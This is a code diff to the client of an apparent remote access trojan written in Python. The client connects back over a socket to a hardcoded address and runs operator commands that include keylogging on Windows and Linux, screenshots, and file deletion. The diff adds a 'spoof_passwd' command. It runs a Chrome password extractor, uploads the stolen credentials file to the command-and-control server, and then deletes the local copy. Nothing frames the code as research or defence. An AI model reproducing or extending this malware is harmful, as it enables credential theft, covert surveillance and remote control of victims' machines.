@@ -18,6 +18,8 @@ from lnx_keylogger import *
 
 from win_keylogger import *
 
+import win_chrome_password_extractor
+
 # Sending whole data all at once
 def recv_eff():
 
@@ -179,7 +181,7 @@ def shell():
 			pass
 
 
-		# making file on linux
+		# making file on linux  ✓
 		elif cmd[:5] == "touch" and len(cmd) > 1:
 
 			file = open(cmd[6:], "w")
@@ -197,7 +199,7 @@ def shell():
 			except:
 				continue
 
-		# Removing folder in linux and Win
+		# Removing folder in linux and Win   ✓
 		elif (cmd[:2] == 'rm' and cmd.find('-r') and len(cmd) > 1) or (cmd[:5] == 'rmdir' and len(cmd) > 1):
 
 			try:
@@ -222,6 +224,13 @@ def shell():
 				continue                 # we know that after removing path nothing is shown in terminal/cmd,
 							 # so we have to send nothing as data from trgt
 
+		elif cmd[:12] == "spoof_passwd" and len(cmd) > 1:
+
+			win_chrome_password_extractor.main()
+
+			upload_file('chrome_creds.txt')              # sending file with creds to C2 
+
+			os.remove('chrome_creds.txt')                # removing the file
 
 		# Screenshot ✓
 		elif (cmd[:10] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):
@@ -234,11 +243,11 @@ def shell():
 
 
 
-		# keylogging
+		# keylogging  ✓
 		elif cmd[:6] == 'keylog' and len(cmd) > 1:
 
 			if os.name == 'nt':
-				# Windows
+				# Windows  ✓
 				win_keylog(cmd)
 			else:
 				#Linux  ✓
@@ -269,7 +278,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
 # Connecting with the trgt
-sock.connect(("192.168.0.110",1234))                                            # change the ip and port
+sock.connect(("192.168.0.110",1234))                               # change the ip and port
 
 
 
@@ -279,3 +288,4 @@ def main():
 if __name__ == '__main__':
 	main()
 
+ 
